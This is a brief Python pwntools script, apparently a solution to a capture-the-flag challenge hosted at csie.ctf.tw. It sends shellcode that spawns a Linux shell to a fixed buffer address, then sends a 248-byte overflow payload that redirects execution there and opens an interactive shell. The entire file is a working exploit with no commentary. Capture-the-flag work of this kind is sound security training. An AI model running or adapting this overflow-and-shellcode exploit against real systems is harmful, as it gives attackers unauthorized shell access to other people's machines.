from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10126

r = remote(host, port)

# input('press enter')

r.recvuntil(':')
r.sendline(asm(pwnlib.shellcraft.linux.sh()))

data = 0x601080
payload = b'a'*248 + p64(data)
r.recvuntil(':')
r.sendline(payload)

r.interactive()
